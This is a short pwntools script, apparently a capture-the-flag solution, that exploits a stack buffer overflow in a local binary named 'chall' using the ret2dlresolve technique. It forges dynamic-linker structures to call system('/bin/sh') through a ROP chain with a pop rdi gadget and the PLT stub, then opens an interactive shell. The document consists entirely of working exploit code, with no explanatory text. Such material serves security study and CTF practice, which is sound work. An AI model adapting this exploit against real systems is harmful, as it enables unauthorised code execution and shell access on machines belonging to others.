from pwn import * 

binary = "./chall"
p = process(binary) 
elf = ELF(binary)

s = '''
b * vuln+50
'''
gdb.attach(p, s)
pause()

# Create dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

# Get necessary addresses
pop_rdi = 0x00000000004012c3
plt_0 = elf.get_section_by_name('.plt').header.sh_addr

# Create the payload
payload = flat(
    b'A' * 0x70,         # padding to rbp
    b'B' * 8,            # overwrite old rbp
    pop_rdi,             # pop rdi gadget
    dlresolve.data_addr, # pointer to "/bin/sh"
    plt_0,               # plt entry
    dlresolve.reloc_index,  # reloc index
    dlresolve.payload    # our forged structures
)

p.sendline(payload)
p.interactive()